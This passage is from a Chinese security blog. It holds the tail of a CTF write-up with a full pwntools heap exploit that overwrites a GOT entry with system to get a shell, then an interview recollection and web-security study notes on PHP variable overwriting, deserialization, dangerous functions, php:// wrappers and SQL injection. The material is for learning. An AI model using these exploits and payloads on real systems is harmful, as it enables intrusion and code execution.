class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!  /usr/bin/env    python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./oreo"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./oreo"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># address</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">"printf_got -&gt; "</span> + hex(printf_got))</span><br><span class="line">printf_libc = libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">"printf_libc -&gt; "</span> + hex(printf_libc))</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"system_libc -&gt; "</span> + hex(system_libc))</span><br><span class="line">message_addr = <span class="number">0x0804a2a8</span></span><br><span class="line">log.info(<span class="string">"message_addr -&gt; "</span> + hex(message_addr))</span><br><span class="line">strlen_got = elf.got[<span class="string">'strlen'</span>]</span><br><span class="line">log.info(<span class="string">"strlen_got -&gt; "</span> + hex(strlen_got))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_refles</span><span class="params">(name,desc)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_refles</span><span class="params">()</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(content)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">'a'</span> * <span class="number">27</span> + p32(printf_got)</span><br><span class="line">    desc = <span class="string">'b'</span></span><br><span class="line">    log.info(<span class="string">"name -&gt; "</span> + name)</span><br><span class="line">    log.info(<span class="string">"desc -&gt; "</span> + desc)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add refle and overwrite the prev_riles</span></span><br><span class="line">    add_refles(name, desc)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak printf_addr</span></span><br><span class="line">    show_refles()</span><br><span class="line">    sh.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    printf_addr = u32(sh.recvn(<span class="number">4</span>))</span><br><span class="line">    log.info(<span class="string">"printf_addr -&gt; "</span> + hex(printf_addr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> printf_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_system_addr</span><span class="params">(addr, libc_addr)</span>:</span></span><br><span class="line">    base = addr - libc_addr</span><br><span class="line">    system_addr = base + system_libc</span><br><span class="line">    log.info(<span class="string">"system_addr -&gt; "</span> + hex(system_addr))</span><br><span class="line">    <span class="keyword">return</span> system_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_chunk</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># We need to make the size of chunk 0x41</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span><span class="number">-1</span>):</span><br><span class="line">        add_refles(str(i), <span class="string">"fuck u"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a chunk to set the house into link</span></span><br><span class="line">    name = <span class="string">'a'</span> * <span class="number">27</span> + p32(message_addr)</span><br><span class="line">    desc = <span class="string">"fuck U!"</span></span><br><span class="line">    log.info(<span class="string">"name -&gt; "</span> + name)</span><br><span class="line">    log.info(<span class="string">"desc -&gt; "</span> + desc)</span><br><span class="line">    add_refles(name, desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_refles</span><span class="params">()</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    printf_addr = leak_addr()</span><br><span class="line">    system_addr = get_system_addr(printf_addr, printf_libc)</span><br><span class="line">    fake_chunk()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The padding's length is from message to the next chunk size </span></span><br><span class="line">    <span class="comment"># padding = padding * (0xa0 + 0x40 - 0xc0 + 4) + p32(0x41) </span></span><br><span class="line">    padding= <span class="string">"\x00\x00\x00\x00"</span>*<span class="number">9</span> + p32(<span class="number">0x41</span>)</span><br><span class="line">    leave_message(padding)</span><br><span class="line">    order_refles()</span><br><span class="line"></span><br><span class="line">    show_refles()</span><br><span class="line">    <span class="comment"># Overwrite the strlen_got</span></span><br><span class="line">    name = <span class="string">'fuck U~'</span></span><br><span class="line">    desc = p32(strlen_got)</span><br><span class="line">    add_refles(name, desc)</span><br><span class="line"></span><br><span class="line">    leave_message(p32(system_addr)+ <span class="string">";/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传<code>p32(system_addr) + &quot;;/bin/sh\x00&quot;</code>.因为,在strlen被覆盖之后，会执行<code>addEnd()</code>函数，相当于<code>strlen(p32(system_addr) + &quot;;/bin/sh\x00&quot;.)</code>即<code>system(p32(system_addr)) 和 system(&quot;/bin/sh\x00&quot;)</code>这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入<code>/bin/sh</code>也可getshell。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/oreo.png?raw=true" alt="shell"></p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-12-12</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/12/12/chaitin面试经历/">chaitin面试经历</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><hr>
<p>&emsp;&emsp;求简大佬内推, 2019.12.12去阿里云安全旗下的长亭科技面试, 超级紧张,毕竟是地表最强安全公司. 面试时间15:30,我14:26从806出发,路上吃了碗面,然后找20min没找到地方….后来发现是导航错了.<br>15:26分,到达公司. 看到一堆小零食和一柜子饮料,还有一堆黑客(划掉)安全人员. HR小姐姐人超级好,在微信上和我斗图哈哈哈,然后带来了某巨佬面试我,史上最硬核面试开始了…</p>
<h4 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h4><hr>
<h5 id="后来知道这是P师傅，师傅实在是太强了，现在每天给师傅递茶。"><a href="#后来知道这是P师傅，师傅实在是太强了，现在每天给师傅递茶。" class="headerlink" title="后来知道这是P师傅，师傅实在是太强了，现在每天给师傅递茶。:-)"></a>后来知道这是P师傅，师傅实在是太强了，现在每天给师傅递茶。:-)</h5><p>&emsp;&emsp;面试官是一位超级和善的安全研究员,先从最简单的开始问我,栈溢出的原理是啥类,linux下二进制保护措施有啥呀,原理是啥呀,咋绕过呀,能不能更给力一点呀同学?</p>
<p>我: 叽里呱啦….</p>
<p>带佬: 说说Heap segment的结构呗?</p>
<p>我: 首先程序刚开始没有建立Heap Segment,第一次malloc时创建堆段……</p>
<p>带佬: 简单的说一下malloc_chunk的结构吧</p>
<p>我: 首先他是个结构体…….</p>
<p>带佬: 第一次运行malloc时具体发生了啥鸭?</p>
<p>我: 第一分配内存首先要运行molloc_consolidate然后malloc_init_state进行初始化…..</p>
<p>带佬: unlink有什么问题吗?</p>
<p>我: 可能导致任意写或者地址泄漏,但是高版本的glibc加了验证,几乎不能任意写了</p>
<p>带佬: 对操作系统内核溢出有了解吗?</p>
<p>我: 嘤嘤嘤…没有</p>
<p>带佬: …</p>
<p>带佬: sql注入大概分为那几种啊?</p>
<p>我: 有回显,无回显(盲注)</p>
<p>带佬: 盲注分为哪几种,分别怎么利用</p>
<p>我: 叽里呱啦…</p>
<p>带佬: order by和limit注入分别怎么利用</p>
<p>我: 呱啦叽里…</p>
<p>带佬: ssrf盲打如何操作, 如何验证payload, 如何内网打redis</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true" alt="cry"></p>
<p>我: 嘤嘤嘤…不会</p>
<p>带佬: linux下如何代码注入? 如何检测rootkit?</p>
<p>我: 嗯…ptrace? 然后分析流量?…(哭</p>
<p>带佬: …ELF的格式给讲讲呗</p>
<p>我: 啊, 那个头巴拉巴拉…..(勉强萌混过关)</p>
<p>带佬: 还行, 分析过cve么,就前几天那个phpfmp的洞看过吗?</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true" alt="cry"></p>
<p>我: …哭</p>
<p>带佬: 了解TLB的原理么,简单说说呗? 还有进程间通信啥的?</p>
<p>我: 巴拉巴拉…对吧….</p>
<p>带佬: 还能更底层么?</p>
<p>我: …嘤..不会了</p>
<p>带佬: 内网渗透用哪些转发工具</p>
<p>我: lcx frp</p>
<p>带佬: ssh的转发功能用过么? 了解扫描器原理么? 端口显示open close filter意味着什么,从协议角度分析一下.</p>
<p>我: 啊? 啊? 啊?…不会</p>
<p>带佬: … section和segment啥区别呀</p>
<p>我: 一个segment由多个section组成?…</p>
<p>带佬: 恩, 解释性语言的逆向原理了解过么,就pyc那种.</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true" alt="cry"></p>
<p>我: …无</p>
<p>带佬: TCP/IP三次握手讲讲呗?</p>
<p>我: 嗯…叽里呱啦..是吧?…</p>
<p>带佬似笑非笑: 你这个cpu怎么写的啊</p>
<p>我(都让让,我要装逼了): 乌啦乌啦…大概就是这样(恩,牛逼吧)</p>
<p>带佬: 还行, linux下的SIGNAL了解么</p>
<p>我: 只是用过,kill -9之类的…原理不懂</p>
<p>带佬: linux熟么?</p>
<p>我(熟的一p): 还行</p>
<p>带佬: 查看端口, 查找内容, 检测流量, 监视进程, 硬件读写,….噼里啪啦问了一堆</p>
<p>我: %^#@!大概就是这样</p>
<p>带佬: 恩,还行.正向shell和反向shell有什么区别?</p>
<p>我: 这样那样…</p>
<p>带佬: 权限维持咋弄啊?</p>
<p>我: crontab……</p>
<p>带佬: 反序列化讲讲</p>
<p>我: ….嗯嗯大概这样</p>
<p>带佬: 固件提取咋整啊</p>
<p>我: 编程器搞出来, binwalk看一看, ida擼一撸</p>
<p>带佬: binwalk分析不出来咋正呀?</p>
<p>我: 啊? 还能这样?</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/cry.jpeg?raw=true" alt="cry"></p>
<p>带佬: magic number被去掉了或者elf结构乱了你分析个啥啊</p>
<p>我: 嗷嗷嗷…</p>
<p>带佬: 还行吧,我简单介绍一下我们部门….噼里啪啦…看你个人选择吧,我们这边偏业务研究,综合性比较强,楼下偏理论,负责打比赛搞名气的.</p>
<p>我: 都行都行</p>
<p>带佬: 有啥要问我的么?</p>
<p>我: 能发offer么</p>
<p>带佬: …还行, 我去叫hr</p>
<p>我: …</p>
<h4 id="超级nice的HR姐姐"><a href="#超级nice的HR姐姐" class="headerlink" title="超级nice的HR姐姐"></a>超级nice的HR姐姐</h4><hr>
<p>&emsp;&emsp;HR姐姐就问了问性格啥的, 能来几天啊, 为啥干这个呀, 然后开始跟她将笑话…嗯…</p>
<p>HR姐姐: 我们一天300</p>
<p>我(woc这么多): 嗯, 还行</p>
<p>HR姐姐: 包吃</p>
<p>我(woc还包吃): 哦, 不错哦</p>
<p>HR姐姐: 有啥要问得嘛?加个微信呗?</p>
<p>我(加加加): 能给offer么?哭哭</p>
<p>HR姐姐: 哈哈哈这两天会通知你结果.</p>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><hr>
<p>&emsp;&emsp;出来的时候才意识到只有一次技术面,看网上都是好几面…但是感觉挺稳的,毕竟相谈甚欢,赶紧问问简大佬</p>
<p>大概过了一个小时, 简大老和我说稳了….耶! 点个外卖奖励一下自己.</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/smile.jpg?raw=true" alt="smile"></p>
<h4 id="基础知识整理"><a href="#基础知识整理" class="headerlink" title="基础知识整理"></a>基础知识整理</h4><p>&emsp;&emsp;整理了一下基础知识, 整理了一半web突然发现我是想申二进制来着…不管了</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><hr>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ol>
<li><p>变量覆盖</p>
<ol>
<li><p>extract()变量覆盖</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int extract ( <span class="keyword">array</span> $var_array [, int $extract_type [, string $prefix ]])</span><br></pre></td></tr></table></figure>
<p>extract()函数将一个键值数组数组中的值导入符号表.第三个参数可以设置为<code>EXTR_SKIP</code>避免覆盖,默认为<code>EXRE_OVERWRITE</code>.</p>
<ol start="2">
<li>parse_str()<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void parse_str ( string $str [, <span class="keyword">array</span> &amp;$arr ])</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>parse_str()将字符串解析到变量中.<br>例如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">'oop'</span>;</span><br><span class="line">    parse_str($_SERVER[<span class="string">"QUERY_STRING"</span>]);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">'fuck'</span>) &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造payload: curl “127.0.0.1?a=fuck”</p>
<ol start="3">
<li>$$value 类型覆盖<br>php中变量值可作为第二个变量的名.例如:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">"hello"</span>;</span><br><span class="line">$$a = <span class="string">"world"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $$a"</span>;   <span class="comment">// helloworld</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$a $&#123;$a&#125;"</span>; <span class="comment">//helloworld</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$&#123;"</span>hello<span class="string">"&#125;"</span>; <span class="comment">//world</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>因此foreach在遍历数组时可能导致覆盖,例如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  &#123;</span><br><span class="line">    $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="string">"test"</span>;   </span><br><span class="line"><span class="keyword">if</span>($id === <span class="string">"fuck"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Nothing..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>?id=fuck 可覆盖id变量</p>
<ol start="4">
<li>import_request_variables()<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables (string $types [, string $prefix])</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀.<br>例如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">"0"</span>;</span><br><span class="line">    import_request_variables(<span class="string">"G"</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Fucked!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Nothing!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>?a=1 就会echo fucked</p>
</li>
</ol>
</li>
</ol>
<ol start="2">
<li><p>反序列化<br> 将json转化为实例后恶意执行代码,例:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $b = <span class="string">"b"</span>;</span><br><span class="line">    <span class="keyword">private</span> $c = <span class="string">"c"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line">$data = serialize($test);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p> 得到:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:"test":3:&#123;s:4:"flag";s:9:"flag&#123;233&#125;";s:4:"*b";s:1:"b";s:7:"testc";s:1:"c";&#125;</span><br></pre></td></tr></table></figure>
<p> 一般以type:length:content;这种格式存在.要注意两点</p>
<ol>
<li>protected类型属性名会变成 – %00*%00属性名</li>
<li><p>private类型属性名会变成   – %00类名%00属性名 </p>
<h4 id="相关magic方法"><a href="#相关magic方法" class="headerlink" title="相关magic方法"></a>相关magic方法</h4><p>必须知道的魔法方法：<br>这里就不得不介绍几个我们必须知道的魔法方法了</p>
</li>
<li><p>construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。</p>
</li>
<li>wakeup() ：unserialize()时会自动调用</li>
<li>destruct()：当对象被销毁时会自动调用。</li>
<li>toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li>
<li>get() :当从不可访问的属性读取数据</li>
<li><p>call(): 在对象上下文中调用不可访问的方法时触发</p>
<h4 id="利用phar-扩展攻击面"><a href="#利用phar-扩展攻击面" class="headerlink" title="利用phar://扩展攻击面"></a>利用phar://扩展攻击面</h4><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">参考文章</a></p>
</li>
</ol>
</li>
<li><p>魔法函数</p>
<ol>
<li><strong>sleep() 和 </strong>wakeup()</li>
<li><strong>construct() 和 </strong>destruct()</li>
<li>__toString()</li>
<li><strong>invoke() 和 </strong>call()</li>
<li><strong>get() 和  </strong>set()</li>
</ol>
</li>
<li><p>危险函数</p>
<ol>
<li><p>system()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
</li>
<li><p>shell_exec()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( string $cmd )</span><br></pre></td></tr></table></figure>
</li>
<li><p>exec()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec( string $cmd )</span><br></pre></td></tr></table></figure>
</li>
<li><p>passthru()</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
</li>
<li><p>assert()<br> 如果assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>popen()<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource popen ( string command, string mode )</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite().</p>
<ol start="7">
<li>proc_open()<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource proc_open ( string cmd, <span class="keyword">array</span> descriptorspec, <span class="keyword">array</span> &amp;pipes [, string cwd [, <span class="keyword">array</span> env [, <span class="keyword">array</span> other_options]]] )</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>与popen类似，但是可以提供双向管道。具体的参数读者可 以自己翻阅php manual</p>
<blockquote>
<p>注意：<br>A. 后面需要使用proc_close()关闭资源，并且如果是 pipe 类型，需要用 pclose() 关闭句柄。<br>B. proc_open 打开的程序作为 php 的子进程，php 退出后该子进程也会退出。</p>
</blockquote>
<ol start="8">
<li><p>其他</p>
<ul>
<li>pfsockopen()</li>
<li>syslog()</li>
<li>openlog()  </li>
<li>chroot()</li>
<li>chown()</li>
<li>scandir()</li>
</ul>
</li>
</ol>
</li>
</ol>
</li>
<li><p>伪协议</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>file://<br> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
</li>
<li><p>php://<br> php://filter在双off的情况下也可以正常使用；<br> 条件：<br> 不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启    allow_url_include</p>
</li>
<li><p>php://filter<br> php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分 隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于    读或写链。</span><br></pre></td></tr></table></figure>
<p>php://filter/read=convert.base64-encode/resource=upload.php<br>这里读的过滤器为convert.base64-encode，就和字面上的意思一样，把输入流base64-encode。<br>resource=upload.php，代表读取upload.php的内容</p>
</li>
<li><p>php://input<br> php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。<br> 注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>
</li>
<li><p>file:// data:// 等</p>
<p><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">参考文章</a></p>
</li>
</ol>
</li>
<li><p>文件包含</p>
<ol>
<li>include() </li>
<li>inlcude_onec()</li>
<li>require()</li>
<li>require_once()</li>
<li>各种伪协议<br> <a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">参考文章</a></li>
</ol>
</li>
<li><p>命令执行<br> 见危险函数和反序列化</p>
</li>
<li><p>常见框架</p>
<ol>
<li>ThinkPHP<ul>
<li><a href="https://www.freebuf.com/column/209612.html" target="_blank" rel="noopener">RCE</a></li>
<li><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">Inject</a></li>
</ul>
</li>
<li>Laravel<ul>
<li><a href="https://xz.aliyun.com/t/5331" target="_blank" rel="noopener">Inject</a> (比较鸡肋)</li>
<li><a href="https://www.jianshu.com/p/5aac92a4949f" target="_blank" rel="noopener">Unserialize</a> 太强了</li>
</ul>
</li>
<li>Zend</li>
<li>Lumen</li>
</ol>
</li>
</ol>
<h3 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL Inject"></a>SQL Inject</h3><ol>
<li><p>盲注</p>
<ol>
<li>基于Bool</li>
<li>基于时间</li>
<li><p>基于报错</p>
<blockquote>
<p>这一部分知识点爆炸多</p>
</blockquote>
<h4 id="基于Bool"><a href="#基于Bool" class="headerlink" title="基于Bool"></a>基于Bool</h4><p>一般这种注入要求我们构造逻辑判断,通常需要我们截取字符串然后进行比对.</p>
<p>常用的截取函数:</p>
<ul>
<li>mid()</li>
<li>substr()</li>
<li>left()</li>
